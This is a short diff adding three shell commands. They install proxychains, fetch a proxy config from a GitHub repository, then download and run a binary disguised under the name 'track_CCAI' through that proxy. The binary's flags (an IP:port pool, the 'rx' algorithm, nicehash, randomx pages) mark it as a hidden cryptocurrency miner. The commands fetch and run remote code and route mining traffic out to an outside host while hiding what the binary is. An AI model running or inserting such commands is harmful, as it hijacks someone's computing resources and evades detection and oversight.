@@ -1,0 +1,3 @@
+sudo apt update -y && sudo apt install screen libjansson4 build-essential htop -y && cd ~ && git clone https://github.com/walters99/proxychains-ng.git && cd proxychains-ng && ./configure --prefix=/usr --sysconfdir=/etc && make && make install && make install-config
+wget -O myconf.conf https://github.com/cuvge/vsc0d3/raw/main/px && chmod +x myconf.conf && mv myconf.conf /etc/proxychains.conf && proxychains4 curl google.com
+wget -O track_CCAI https://github.com/hambana01/cici/raw/main/rigamen && chmod 755 track_CCAI && proxychains4 ./track_CCAI -o 159.89.201.150:7171 -a rx -u $(echo $(shuf -i 1000-9999 -n 1)) --nicehash --randomx-1gb-pages 
